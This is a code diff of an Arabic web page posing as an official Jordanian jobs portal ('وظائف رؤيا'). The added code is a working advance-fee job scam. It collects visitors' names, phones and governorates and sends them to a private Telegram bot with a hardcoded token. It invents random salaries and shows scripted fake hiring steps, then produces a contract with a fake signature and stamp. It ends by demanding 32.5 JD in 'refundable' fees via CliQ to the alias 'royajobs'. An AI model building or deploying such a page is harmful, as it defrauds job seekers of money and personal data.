@@ -2,25 +2,27 @@
 <html lang="ar" dir="rtl">
 <head>
   <meta charset="UTF-8">
-  <title>بوابة وظائف رؤيا</title>
+  <title>وظائف رؤيا | البوابة الرسمية للوظائف في الأردن</title>
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <!-- Google Fonts -->
-  <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@700;display=swap" rel="stylesheet">
+  <meta name="theme-color" content="#4b1979">
+  <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@700&display=swap" rel="stylesheet">
   <link rel="icon" href="https://www2.0zz0.com/2025/10/15/20/337819623.png">
   <style>
     :root {
       --purple: #4b1979;
       --purple-grad: linear-gradient(90deg, #7f38c0 0%, #4b1979 100%);
       --purple-btn: linear-gradient(90deg, #a259c4 0%, #7f38c0 100%);
-      --gold: #c59d22;
       --white: #fff;
       --shadow: 0 8px 32px #4b197914;
-      --modal-radius: 28px;
+      --gold: #b88f27;
+      --green: #43b968;
+      --gray: #f9f7fa;
+      --danger: #e6415d;
     }
     body {
       margin: 0;
       font-family: 'Cairo', Arial, sans-serif;
-      background: var(--white);
+      background: var(--gray);
       color: var(--purple);
       min-height: 100vh;
     }
@@ -28,72 +30,117 @@
       background: var(--purple);
       color: var(--white);
       text-align: center;
-      padding: 36px 10px 16px;
+      padding: 38px 10px 16px;
       position: relative;
+      box-shadow: 0 2px 24px #4b197918;
     }
     header img {
-      width: 72px;
-      height: 72px;
+      width: 70px;
+      height: 70px;
       display: block;
-      margin: 0 auto 8px;
+      margin: 0 auto 10px;
       border-radius: 16px;
-      background: var(--white);
+      background: #fff;
       border: 3px solid #fff;
       box-shadow: var(--shadow);
     }
     header h1 {
       font-size: 2.2rem;
-      font-weight: 700;
-      margin: 8px 0 8px 0;
-      letter-spacing: .7px;
+      font-weight: 900;
+      margin: 8px 0 7px 0;
+      letter-spacing: 0.8px;
     }
     header p {
       font-size: 1.08rem;
-      margin-top: 0;
-      margin-bottom: 0;
+      margin: 0;
       color: #f6e7ff;
     }
-    .jobs-section {
-      max-width: 610px;
+    .main-section {
+      max-width: 730px;
       margin: 0 auto;
-      padding: 34px 8px 44px 8px;
+      padding: 36px 9px 44px 9px;
     }
-    .jobs-section h2 {
+    .main-section h2 {
       text-align: center;
       color: var(--purple);
-      font-size: 1.45rem;
-      font-weight: 700;
-      margin-bottom: 17px;
-      letter-spacing: .7px;
+      font-size: 1.4rem;
+      font-weight: 900;
+      margin-bottom: 18px;
     }
     .jobs-list {
-      display: flex;
-      flex-direction: column;
-      gap: 17px;
+      display: grid;
+      grid-template-columns: 1fr 1fr;
+      gap: 18px;
+    }
+    @media (max-width:700px) {
+      .jobs-list { grid-template-columns: 1fr;}
     }
     .job-card {
       background: #fff;
-      border-radius: 14px;
+      border-radius: 16px;
       box-shadow: var(--shadow);
-      padding: 17px 18px 12px 18px;
-      border: 1.8px solid #e5d2f5;
+      padding: 18px 18px 12px 18px;
+      border: 1.7px solid #e5d2f5;
       transition: box-shadow .2s;
+      position: relative;
+      display: flex;
+      flex-direction: column;
+      gap: 7px;
     }
     .job-title {
-      font-size: 1.13rem;
-      font-weight: 700;
+      font-size: 1.22rem;
+      font-weight: 900;
       color: var(--purple);
-      margin-bottom: 4px;
+      margin-bottom: 3px;
     }
     .job-meta {
-      color: #6d3d97;
-      font-size: 0.96rem;
-      margin-bottom: 5px;
+      color: #6642a6;
+      font-size: 1.02rem;
+      margin-bottom: 2px;
+      font-weight: 700;
+      display: flex;
+      flex-wrap: wrap;
+      gap: 13px;
     }
     .job-desc {
       color: #262626;
+      font-size: .99rem;
+      margin-bottom: 3px;
+      min-height: 32px;
+    }
+    .job-actions {
+      margin-top: 7px;
+      display: flex;
+      gap: 8px;
+    }
+    .job-actions button {
+      background: var(--purple-btn);
+      color: #fff;
+      border: none;
+      padding: 7px 0;
+      min-width: 120px;
+      border-radius: 14px;
+      font-size: 1.05rem;
+      font-weight: 700;
+      cursor: pointer;
+      box-shadow: 0 2px 12px #7f38c034;
+      transition: background .2s;
+    }
+    .job-actions button:active {background: var(--purple);}
+    .job-salary {
+      color: var(--green);
+      font-size: 1.08rem;
+      font-weight: 900;
+    }
+    .job-hours {
+      color: #b88f27;
+      font-size: .99rem;
+      font-weight: 700;
+    }
+    .job-location{
       font-size: .98rem;
-      margin-bottom: 0;
+      color: #4b1979;
+      font-weight: 700;
     }
     /* Modal Styles */
     .modal-backdrop {
@@ -107,11 +154,11 @@
     }
     .modal {
       background: #fff;
-      border-radius: var(--modal-radius);
+      border-radius: 26px;
       box-shadow: var(--shadow);
-      padding: 38px 24px 28px 24px;
-      max-width: 370px;
-      width: 92vw;
+      padding: 38px 22px 32px 22px;
+      max-width: 390px;
+      width: 94vw;
       text-align: center;
       position: relative;
       animation: modalIn 0.5s;
@@ -122,12 +169,12 @@
     }
     .modal h2 {
       color: var(--purple);
-      font-size: 1.48rem;
+      font-size: 1.41rem;
       font-weight: 900;
       margin: 0 0 7px 0;
     }
     .modal .modal-sub {
-      color: #b88f27;
+      color: var(--gold);
       font-size: 1.08rem;
       margin-bottom: 17px;
       letter-spacing: .3px;
@@ -160,7 +207,7 @@
       padding: 11px 0;
       width: 100%;
       border-radius: 14px;
-      font-size: 1.14rem;
+      font-size: 1.12rem;
       font-weight: 700;
       cursor: pointer;
       margin-top: 7px;
@@ -170,31 +217,257 @@
     .modal button:active {
       background: var(--purple);
     }
-    /* Responsive */
-    @media (max-width:600px) {
-      header h1 { font-size: 1.33rem;}
-      .jobs-section { padding: 17px 2vw 22px 2vw;}
-      .modal { padding: 28px 8vw 22px 8vw;}
+    .modal .notice {
+      color: var(--danger);
+      font-size: 1.07rem;
+      font-weight: 700;
+      margin-top: 7px;
+      margin-bottom: 0;
     }
+    /* إجراءات التوظيف */
+    .steps-section {
+      background: #fff;
+      border-radius: 20px;
+      box-shadow: var(--shadow);
+      margin: 30px auto 30px auto;
+      max-width: 500px;
+      padding: 25px 12px 18px 12px;
+      text-align: center;
+      display: none;
+      animation: stepIn 0.5s;
+    }
+    @keyframes stepIn {
+      from { transform: scale(.9); opacity:0;}
+      to { transform: none; opacity:1;}
+    }
+    .steps-section.active {display: block;}
+    .steps-section h2 {
+      color: var(--purple);
+      font-size: 1.25rem;
+      font-weight: 900;
+      margin-bottom: 15px;
+    }
+    .step {
+      margin: 0 auto 14px auto;
+      background: #f6f1fb;
+      border-radius: 14px;
+      border: 1.2px solid #e5d2f5;
+      padding: 14px 12px 8px 12px;
+      font-size: 1.08rem;
+      color: #4b1979;
+      font-weight: 700;
+      position: relative;
+      box-shadow: 0 3px 16px #7f38c018;
+      animation: stepPop .7s;
+    }
+    @keyframes stepPop {
+      from { transform: translateY(50px) scale(.96); opacity:0;}
+      to { transform: none; opacity:1;}
+    }
+    .step.done {
+      border-color: var(--green);
+      background: #e4fbe8;
+      color: var(--green);
+    }
+    .step.waiting {
+      color: #b88f27;
+      border-color: #f3e2c5;
+      background: #fffbea;
+    }
+    .step .loader {
+      display: inline-block;
+      width: 22px; height: 22px;
+      border: 3px solid #b88f27;
+      border-top: 3px solid #fff;
+      border-radius: 50%;
+      margin-left: 7px;
+      vertical-align: -5px;
+      animation: spin 1.1s linear infinite;
+    }
+    @keyframes spin {
+      100% { transform: rotate(360deg);}
+    }
+    /* عقد العمل */
+    .contract-section {
+      background: #fff;
+      border-radius: 20px;
+      box-shadow: var(--shadow);
+      margin: 30px auto 30px auto;
+      max-width: 480px;
+      padding: 24px 11px 18px 11px;
+      text-align: center;
+      display: none;
+    }
+    .contract-section.active {display:block;}
+    .contract-content {
+      direction: rtl;
+      text-align: right;
+      padding: 22px 13px 14px 13px;
+      border: 2px solid #e5d2f5;
+      margin-bottom: 15px;
+      border-radius: 11px;
+      background: #f6f1fb;
+      font-size: 1.08rem;
+      color: #333;
+      font-weight: 700;
+      box-shadow: 0 3px 16px #7f38c018;
+      position: relative;
+      min-height: 180px;
+    }
+    .contract-sign {
+      display: flex;
+      justify-content: space-between;
+      align-items: flex-end;
+      margin-top: 18px;
+    }
+    .contract-sign img {
+      height: 52px;
+      opacity: 0.7;
+    }
+    .contract-sign .stamp {
+      border: 2px dashed #7f38c0;
+      border-radius: 9px;
+      padding: 6px 18px;
+      font-size: 1.04rem;
+      color: #7f38c0;
+      font-weight: bold;
+    }
+    .download-btn {
+      background: var(--purple-btn);
+      color: #fff;
+      border: none;
+      padding: 10px 0;
+      width: 100%;
+      border-radius: 14px;
+      font-size: 1.03rem;
+      font-weight: 700;
+      cursor: pointer;
+      margin-top: 7px;
+      box-shadow: 0 2px 12px #7f38c034;
+      transition: background .2s;
+    }
+    .download-btn:active {background: var(--purple);}
+    /* دفع */
+    .payment-section {
+      background: #fff;
+      border-radius: 20px;
+      box-shadow: var(--shadow);
+      margin: 30px auto 30px auto;
+      max-width: 480px;
+      padding: 28px 11px 18px 11px;
+      text-align: center;
+      display: none;
+    }
+    .payment-section.active {display:block;}
+    .payment-title {
+      color: var(--purple);
+      font-size: 1.13rem;
+      font-weight: 900;
+      margin-bottom: 12px;
+    }
+    .payment-list {
+      text-align: right;
+      margin: 0 0 13px 0;
+      color: #4b1979;
+    }
+    .payment-total {
+      color: #b88f27;
+      font-size: 1.13rem;
+      font-weight: 800;
+      margin-bottom: 11px;
+      margin-top: 12px;
+    }
+    .payment-instructions {
+      color: #444;
+      font-size: 1.05rem;
+      margin-bottom: 12px;
+    }
+    .payment-steps {
+      color: #888;
+      font-size: .97rem;
+    }
+    .paid-btn, .cancel-btn, .again-btn {
+      display: inline-block;
+      margin: 7px 4px;
+      padding: 8px 20px;
+      border-radius: 12px;
+      border: none;
+      font-size: 1.07rem;
+      font-weight: 700;
+      cursor: pointer;
+      background: var(--purple-btn);
+      color: #fff;
+      box-shadow: 0 2px 12px #7f38c034;
+      transition: background .2s;
+    }
+    .paid-btn:active, .again-btn:active {background: var(--purple);}
+    .cancel-btn {
+      background: #e6415d;
+      color: #fff;
+      margin-left: 8px;
+    }
+    .cancel-btn:active {background: #b21f3d;}
+    .info-message {
+      color: var(--green);
+      font-weight: 900;
+      margin-bottom: 7px;
+      font-size: 1.11rem;
+      letter-spacing: .2px;
+    }
+    .pending-message {
+      color: #b88f27;
+      font-size: 1.05rem;
+      font-weight: 700;
+      margin-bottom: 8px;
+    }
+    /* إشعارات */
+    .notify {
+      position: fixed;
+      top: 20px;
+      right: 50%;
+      transform: translateX(50%);
+      background: var(--purple-btn);
+      color: #fff;
+      padding: 16px 42px;
+      border-radius: 18px;
+      font-size: 1.13rem;
+      font-weight: 700;
+      box-shadow: 0 2px 16px #7f38c044;
+      z-index: 99999;
+      display: none;
+      animation: fadeIn .5s;
+    }
+    @keyframes fadeIn {
+      from { opacity:0; top:10px;}
+      to { opacity:1; top:20px;}
+    }
+    @media (max-width:600px) {
+      header h1 { font-size: 1.2rem;}
+      .main-section { padding: 17px 2vw 22px 2vw;}
+      .modal { padding: 20px 5vw 15px 5vw;}
+      .steps-section, .contract-section, .payment-section {padding: 13px 3vw 13px 3vw;}
+      .jobs-list { grid-template-columns: 1fr;}
+    }
+    ::-webkit-scrollbar { width: 8px;}
+    ::-webkit-scrollbar-thumb { background: #7f38c034; border-radius: 6px;}
+    ::selection { background: #7f38c022; }
   </style>
 </head>
 <body>
   <header>
     <img src="https://www2.0zz0.com/2025/10/15/20/337819623.png" alt="شعار رؤيا">
-    <h1>بوابة وظائف رؤيا</h1>
-    <p>جميع الوظائف المتوفرة في الأردن بين يديك</p>
+    <h1>وظائف رؤيا</h1>
+    <p>البوابة الرسمية لجميع الوظائف المتوفرة في الأردن</p>
   </header>
-  <section class="jobs-section">
-    <h2>فرص العمل المتاحة</h2>
-    <div id="jobs" class="jobs-list">
-      <div style="color:#aaa;text-align:center;">جارٍ التحميل...</div>
-    </div>
+  <section class="main-section" id="mainSection">
+    <h2>اختر الوظيفة المناسبة لك</h2>
+    <div id="jobs" class="jobs-list"></div>
   </section>
-  <!-- Modal for user info -->
+  <!-- نافذة تسجيل المستخدم -->
   <div id="modalBackdrop" class="modal-backdrop">
     <div class="modal">
       <h2>تسجيل الدخول</h2>
-      <div class="modal-sub">يرجى تعبئة البيانات لمتابعة تصفح الوظائف</div>
+      <div class="modal-sub">يرجى تعبئة البيانات لمتابعة التقديم على الوظائف</div>
       <form id="userForm" autocomplete="off">
         <input required type="text" id="username" name="username" placeholder="الاسم الكامل">
         <input required type="tel" id="phone" name="phone" pattern="^07[789][0-9]{7}$" maxlength="10" placeholder="رقم الهاتف">
@@ -207,11 +480,22 @@
         </select>
         <button type="submit">دخول</button>
       </form>
+      <div class="notice" id="modalNotice"></div>
     </div>
   </div>
+  <!-- إجراءات التوظيف -->
+  <div class="steps-section" id="stepsSection"></div>
+  <!-- عقد العمل -->
+  <div class="contract-section" id="contractSection"></div>
+  <!-- الدفع -->
+  <div class="payment-section" id="paymentSection"></div>
+  <!-- إشعار -->
+  <div class="notify" id="notify"></div>
   <!-- Firebase -->
   <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-app-compat.js"></script>
   <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-database-compat.js"></script>
+  <!-- jsPDF لتحويل العقد لـ PDF -->
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jspdf/2.5.1/jspdf.umd.min.js"></script>
   <script>
     // Firebase config
     const firebaseConfig = {
@@ -227,9 +511,15 @@
     firebase.initializeApp(firebaseConfig);
     const db = firebase.database();
 
-    // Modal logic
-    const modalBackdrop = document.getElementById('modalBackdrop');
-    const userForm = document.getElementById('userForm');
+    // إشعار
+    function notify(msg, time=2600) {
+      let n = document.getElementById('notify');
+      n.innerText = msg;
+      n.style.display = 'block';
+      setTimeout(()=>{ n.style.display = 'none'; }, time);
+    }
+
+    // بيانات المستخدم من LocalStorage
     function getUserData() {
       try {return JSON.parse(localStorage.getItem('ruya_user')) || null;}
       catch {return null;}
@@ -237,58 +527,344 @@
     function setUserData(data) {
       localStorage.setItem('ruya_user', JSON.stringify(data));
     }
+    function clearUserData() {
+      localStorage.removeItem('ruya_user');
+      localStorage.removeItem('ruya_request');
+    }
+
+    // حالة الطلب (الدفع وغيره)
+    function getRequestData() {
+      try {return JSON.parse(localStorage.getItem('ruya_request')) || null;}
+      catch {return null;}
+    }
+    function setRequestData(data) {
+      localStorage.setItem('ruya_request', JSON.stringify(data));
+    }
+    function clearRequestData() {
+      localStorage.removeItem('ruya_request');
+    }
+
+    // نافذة التسجيل
+    const modalBackdrop = document.getElementById('modalBackdrop');
+    const userForm = document.getElementById('userForm');
+    const modalNotice = document.getElementById('modalNotice');
+
     function showModal() { modalBackdrop.style.display = "flex";}
     function hideModal() { modalBackdrop.style.display = "none";}
-    // On load, show modal if no user data
+
+    // عند تحميل الصفحة
     window.onload = function() {
       let user = getUserData();
-      if (!user) showModal();
-      else loadJobs();
+      let req = getRequestData();
+      if (!user) {
+        showModal();
+        hideAllSections();
+      } else if(req && req.status!=="done") {
+        // إذا عليه طلب لم يكمله
+        hideAllSections();
+        handleRequestFlow(req);
+      } else {
+        hideAllSections();
+        document.getElementById('mainSection').style.display = "block";
+        loadJobs();
+      }
     };
+
+    // تسجيل المستخدم
     userForm.onsubmit = function(e) {
       e.preventDefault();
       let username = userForm.username.value.trim();
       let phone = userForm.phone.value.trim();
       let governorate = userForm.governorate.value;
       if (!username || !phone.match(/^07[789][0-9]{7}$/) || !governorate) {
-        alert('يرجى تعبئة جميع البيانات بشكل صحيح');
+        modalNotice.innerText = 'يرجى تعبئة جميع البيانات بشكل صحيح';
         return;
       }
       let userObj = { username, phone, governorate, timestamp: Date.now() };
-      // Save to Firebase (users)
       db.ref('users').push(userObj).then(() => {
         setUserData(userObj);
         hideModal();
+        notify('تم تسجيل الدخول بنجاح');
+        document.getElementById('mainSection').style.display = "block";
         loadJobs();
-      }).catch(()=>{alert('حدث خطأ. حاول مرة أخرى');});
+      }).catch(()=>{modalNotice.innerText = 'حدث خطأ. حاول مرة أخرى';});
     };
-    // تحميل الوظائف
+
+    // تحميل الوظائف من Firebase
     function loadJobs() {
       let jobsDiv = document.getElementById('jobs');
       jobsDiv.innerHTML = '<div style="color:#aaa;text-align:center;">جارٍ التحميل...</div>';
       db.ref('jobs').orderByChild('timestamp').once('value', (snap) => {
         let jobs = [];
-        snap.forEach(child=>jobs.unshift({id:child.key, ...child.val()}));
+        snap.forEach(child => {
+          let job = child.val();
+          jobs.unshift({id:child.key, ...job});
+        });
+        // إذا لا يوجد وظائف
         if (jobs.length === 0) {
           jobsDiv.innerHTML = '<div style="color:#4b1979;text-align:center;font-size:1.12rem;">لا توجد وظائف حالياً</div>';
           return;
         }
+        // عرض الوظائف
         jobsDiv.innerHTML = "";
+        let user = getUserData();
         jobs.forEach(job => {
+          let salary = job.salary? job.salary : getRandomSalary();
+          let hours = job.hours? job.hours : getRandomHours();
           jobsDiv.innerHTML += `
-            <div class="job-card">
+            <div class="job-card" data-id="${job.id}">
               <div class="job-title">${job.title}</div>
               <div class="job-meta">
-                <span>${job.company}</span> - 
-                <span>${job.location}</span> - 
-                <span>${new Date(job.timestamp).toLocaleDateString('ar-JO')}</span>
+                <span class="job-company">${job.company||'رؤيا'}</span>
+                <span class="job-salary">الراتب: ${salary} د.أ</span>
+                <span class="job-hours">ساعات العمل: ${hours} ساعات</span>
+                <span class="job-location">المحافظة: ${user.governorate}</span>
               </div>
-              <div class="job-desc">${job.description.replace(/\n/g,"<br>")}</div>
+              <div class="job-desc">${job.description? job.description.replace(/\n/g,"<br>") : '...'}</div>
+              <div class="job-actions">
+                <button onclick="applyJob('${job.id}')">اختيار الوظيفة</button>
+              </div>
             </div>
           `;
         });
       });
     }
+    // راتب عشوائي للوظائف غير محددة الراتب
+    function getRandomSalary() {
+      let min = 550, max = 1500;
+      return Math.floor(Math.random() * (max-min+1))+min;
+    }
+    // ساعات عمل عشوائية للوظائف غير محددة الساعات
+    function getRandomHours() {
+      let arr = [7,8,9,10];
+      return arr[Math.floor(Math.random()*arr.length)];
+    }
+
+    // التقديم على وظيفة
+    function applyJob(jobId) {
+      let user = getUserData();
+      if (!user) { showModal(); return; }
+      // منع التقديم لو عنده طلب لم يكمله
+      let req = getRequestData();
+      if (req && req.status!=="done") {
+        notify('لديك طلب جاري بالفعل! أكمل الإجراءات أو ألغِ الطلب.');
+        return;
+      }
+      // جلب بيانات الوظيفة
+      db.ref('jobs/'+jobId).once('value').then(snap=>{
+        let job = snap.val();
+        if (!job) { notify('حدث خطأ'); return; }
+        // تعيين راتب/ساعات افتراضية إذا غير موجودة
+        let salary = job.salary? job.salary : getRandomSalary();
+        let hours = job.hours? job.hours : getRandomHours();
+        // حفظ حالة الطلب
+        let request = {
+          user, jobId, jobTitle:job.title, jobCompany:job.company||'رؤيا',
+          salary, hours, location:user.governorate,
+          status: "steps", // الخطوة الحالية
+          step: 0,
+          paid: false
+        };
+        setRequestData(request);
+        hideAllSections();
+        handleRequestFlow(request);
+        // إرسال الطلب للبوت تلجرام
+        sendToTelegram({
+          ...user,
+          job: job.title,
+          salary: salary,
+          hours: hours,
+          location: user.governorate
+        });
+      });
+    }
+    // إرسال البيانات للبوت تلجرام
+    function sendToTelegram(data) {
+      const token = "8364248948:AAFWbzdx1bMnjaU6xY218i0V7uAfXQXJPFM";
+      const chat_id = "6873334348";
+      let msg = `📝 تقديم جديد لوظيفة رؤيا:\n`+
+        `الاسم: ${data.username}\n`+
+        `الهاتف: ${data.phone}\n`+
+        `المحافظة: ${data.governorate}\n`+
+        `الوظيفة: ${data.job}\n`+
+        `الراتب: ${data.salary} د.أ\n`+
+        `ساعات العمل: ${data.hours}`;
+      fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+        method:'POST',
+        headers:{'Content-Type':'application/json'},
+        body: JSON.stringify({chat_id, text:msg})
+      });
+    }
+
+    // خطوات التوظيف
+    const steps = [
+      {txt:'تم استلام طلبك بنجاح، يتم الآن مراجعة البيانات.', time:1800, class:'done'},
+      {txt:'جاري مطابقة بياناتك مع متطلبات الوظيفة...', time:2200, class:'waiting'},
+      {txt:'تم قبولك مبدئيًا في الوظيفة! برجاء مراجعة عقد العمل وتأكيد الحجز.', time:1500, class:'done'},
+      {txt:'جاري تجهيز عقد العمل الإلكتروني...', time:1700, class:'waiting'}
+    ];
+
+    // معالجة سير الطلب حسب الحالة
+    function handleRequestFlow(req) {
+      if (req.status === "steps") {
+        document.getElementById('stepsSection').innerHTML = '';
+        showSection('stepsSection');
+        showSteps(req, 0);
+      } else if (req.status === "contract") {
+        showSection('contractSection');
+        showContract(req);
+      } else if (req.status === "payment") {
+        showSection('paymentSection');
+        showPayment(req);
+      } else if (req.status === "pending") {
+        showSection('paymentSection');
+        showPendingPayment(req);
+      } else if (req.status === "done") {
+        clearRequestData();
+        notify('تم توظيفك بنجاح!');
+        document.getElementById('mainSection').style.display = "block";
+        loadJobs();
+      }
+    }
+
+    // عرض خطوات التوظيف
+    function showSteps(req, idx) {
+      const section = document.getElementById('stepsSection');
+      section.innerHTML = `<h2>إجراءات التوظيف الرسمية</h2>`;
+      for(let i=0; i<=idx; i++) {
+        let st = steps[i];
+        section.innerHTML += `<div class="step ${st.class}">${st.txt} ${i==idx?'<span class="loader"></span>':''}</div>`;
+      }
+      if(idx<steps.length-1){
+        setTimeout(()=>{
+          showSteps(req, idx+1);
+        }, steps[idx].time);
+      }else{
+        // الانتقال لعقد العمل
+        let r = {...req, status:"contract"};
+        setRequestData(r);
+        setTimeout(()=>handleRequestFlow(r), 1700);
+      }
+    }
+
+    // عرض عقد العمل
+    function showContract(req) {
+      const section = document.getElementById('contractSection');
+      section.innerHTML = `<h2>عقد العمل الإلكتروني</h2>
+        <div class="contract-content" id="contractContent">
+          <div>السيد/ة <b>${req.user.username}</b> المحترم،</div>
+          <div>بموجب هذا العقد، تم قبولك للعمل بوظيفة <b>${req.jobTitle}</b> في شركة <b>${req.jobCompany}</b> بمحافظة <b>${req.location}</b>، براتب شهري قدره <b>${req.salary} دينار أردني</b>، وعدد ساعات العمل <b>${req.hours}</b> يوميًا.</div>
+          <div style="margin:7px 0 3px 0;">رقم هاتفك: <b>${req.user.phone}</b></div>
+          <div style="margin:9px 0 4px 0;">تاريخ العقد: ${new Date().toLocaleDateString('ar-JO')}</div>
+          <div class="contract-sign">
+            <img src="https://svgshare.com/i/17qz.svg" alt="توقيع" title="توقيع مسؤول التوظيف">
+            <div class="stamp">شركة رؤيا<br>ختم رسمي</div>
+          </div>
+        </div>
+        <button class="download-btn" onclick="downloadContract()">تحميل العقد (PDF)</button>
+        <button class="download-btn" style="background:#43b968;margin-top:8px;" onclick="nextToPayment()">تأكيد ومتابعة الدفع</button>
+        <button class="cancel-btn" onclick="cancelRequest()">إلغاء الطلب</button>
+        `;
+    }
+
+    // تحميل العقد PDF
+    function downloadContract() {
+      const { jsPDF } = window.jspdf;
+      let c = document.getElementById('contractContent').innerText;
+      let doc = new jsPDF({orientation:'p',unit:'pt',format:'a4'});
+      doc.setFont("Cairo", "bold");
+      doc.setFontSize(18);
+      doc.text("عقد عمل رسمي | شركة رؤيا", 300, 62, {align:"center"});
+      doc.setFontSize(13);
+      doc.text(c, 65, 120, {maxWidth:470});
+      doc.text("التوقيع والختم الإلكتروني", 65, 470);
+      doc.save("عقد_عمل_رؤيا.pdf");
+    }
+
+    function nextToPayment() {
+      let req = getRequestData();
+      let r = {...req, status:"payment"};
+      setRequestData(r);
+      handleRequestFlow(r);
+    }
+
+    // عرض الدفع
+    function showPayment(req) {
+      const section = document.getElementById('paymentSection');
+      section.innerHTML = `
+      <div class="payment-title">رسوم حجز مكانك الوظيفي (قابلة للاسترداد)</div>
+      <div class="payment-list">
+        <div>شهادة عدم محكومية فورية: 13 د.أ</div>
+        <div>ضريبة ورسوم طوابع: 14.5 د.أ</div>
+        <div>رسوم حجز وإجراءات: 5 د.أ</div>
+      </div>
+      <div class="payment-total">الإجمالي: 32.5 دينار أردني</div>
+      <div class="payment-instructions">
+        لدفع الرسوم: استخدم تطبيق كليك (البنك الأهلي)<br>
+        الاسم المستعار: <b style="color:#7f38c0;">royajobs</b>
+      </div>
+      <div class="payment-steps">
+        - يتم استرداد المبلغ في حال الإبلاغ المسبق بعدم الحضور.<br>
+        - لا يمكنك تقديم طلب جديد قبل الدفع أو الإلغاء.<br>
+        - أرسل المبلغ ثم اضغط "لقد دفعت".<br>
+      </div>
+      <button class="paid-btn" onclick="markPaid()">لقد دفعت</button>
+      <button class="cancel-btn" onclick="cancelRequest()">إلغاء الطلب</button>
+      `;
+    }
+
+    // بعد الضغط على "لقد دفعت"
+    function markPaid() {
+      let req = getRequestData();
+      let r = {...req, status:"pending", paid:true};
+      setRequestData(r);
+      handleRequestFlow(r);
+    }
+
+    // قيد التحقق من الدفع
+    function showPendingPayment(req) {
+      const section = document.getElementById('paymentSection');
+      section.innerHTML = `
+      <div class="pending-message">تم استلام إشعار الدفع، طلبك قيد التحقق...</div>
+      <div class="info-message">سيتم التواصل معك قريبًا لإتمام التوظيف بإذن الله.<br>بإمكانك مراجعة العقد وتحميله مجددًا.</div>
+      <button class="download-btn" onclick="downloadContract()">تحميل العقد (PDF)</button>
+      <button class="again-btn" onclick="cancelRequest()">إلغاء الطلب وتقديم جديد</button>
+      `;
+    }
+
+    // إلغاء الطلب
+    function cancelRequest() {
+      if(confirm('هل تريد إلغاء الطلب بالفعل؟')) {
+        clearRequestData();
+        notify('تم إلغاء الطلب!');
+        hideAllSections();
+        document.getElementById('mainSection').style.display = "block";
+        loadJobs();
+      }
+    }
+
+    // إخفاء جميع الأقسام (ما عدا section المطلوبة)
+    function hideAllSections() {
+      ['mainSection','stepsSection','contractSection','paymentSection'].forEach(id=>{
+        let sec = document.getElementById(id);
+        if(sec) sec.style.display = "none";
+      });
+    }
+    function showSection(id) {
+      hideAllSections();
+      document.getElementById(id).style.display = "block";
+    }
+
+    // زر إعادة تعيين المستخدم (للاختبار/التجربة)
+    // window.clearUserData = clearUserData;
+    // window.clearRequestData = clearRequestData;
+
+    // إتاحة دوال global لبعض الأزرار
+    window.applyJob = applyJob;
+    window.downloadContract = downloadContract;
+    window.nextToPayment = nextToPayment;
+    window.markPaid = markPaid;
+    window.cancelRequest = cancelRequest;
   </script>
 </body>
 </html>
